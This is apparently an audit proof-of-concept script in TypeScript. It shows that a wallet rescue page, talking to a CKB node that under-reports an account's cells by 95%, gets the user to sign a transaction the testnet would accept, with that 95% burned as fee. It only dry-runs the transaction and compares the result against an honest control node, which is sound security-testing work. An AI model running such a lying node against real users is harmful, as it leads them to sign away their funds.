// Testnet dry run for the audit's rescue finding: the rescue page built against a CKB node that under-reports the
// account's plain cell by 95% produces a transaction the real network accepts (test_tx_pool_accept) whose fee is
// that 95%. Nothing is sent. Control: the same rescue against the honest node.
import * as ccc from "@ckb-ccc/core";
import { connectEvmBackup, openRescueAccount, planRescue, signRescueWithEvm } from "../../../src/rescue/rescue.ts";
import { client, evmProvider, loadKeys, loadState, secpAddress } from "./lib.ts";

const keys = loadKeys();
const state = loadState();
const destination = await secpAddress(keys.D1);

/** The honest node, except that every plain cell at the account's lock is reported with 5% of its capacity. */
function lyingNode(): ccc.Client {
  const node = new ccc.ClientPublicTestnet({ url: "https://testnet.ckb.dev/" });
  const honest = node.findCellsByLock.bind(node);
  Object.assign(node, {
    findCellsByLock: async function* (lock: ccc.ScriptLike, type?: ccc.ScriptLike | null, withData?: boolean) {
      for await (const real of honest(lock, type, withData)) {
        const lie = real.cellOutput.type || real.outputData !== "0x" ? real : ccc.Cell.from({ outPoint: real.outPoint, cellOutput: { ...real.cellOutput, capacity: real.cellOutput.capacity / 20n }, outputData: "0x" });
        await node.cache.recordCells([lie]);
        yield lie;
      }
    },
  });
  return node;
}

async function realInputs(transaction: ccc.Transaction): Promise<bigint> {
  let total = 0n;
  for (const input of transaction.inputs) total += (await client.getCell(input.previousOutput))!.cellOutput.capacity;
  return total;
}

for (const [label, node] of [["control (honest node)", client], ["malicious node"]] as Array<[string, ccc.Client?]>) {
  const rpc = node ?? lyingNode();
  const account = await openRescueAccount(rpc, state.newAddress);
  const entry = await connectEvmBackup(account, evmProvider(keys.E1));
  const plan = await planRescue(rpc, account, entry, destination);
  let shown = "";
  const signed = await signRescueWithEvm(rpc, account, plan, evmProvider(keys.E1, (text) => { shown = text; }));
  const realFee = await realInputs(signed) - signed.getOutputsCapacity();
  const cycles = await client.sendTransactionDry(signed, "passthrough");
  console.log(`${label}: page shows balance ${ccc.fixedPointToString(account.ckb)} CKB, fee ${ccc.fixedPointToString(plan.fee)} CKB, arriving ${ccc.fixedPointToString(plan.ckb)} CKB`);
  console.log(`  wallet was asked to sign: ${shown}`);
  console.log(`  real network: test_tx_pool_accept OK, cycles ${cycles}, real inputs ${ccc.fixedPointToString(await realInputs(signed))} CKB, real fee ${ccc.fixedPointToString(realFee)} CKB (not sent)`);
}
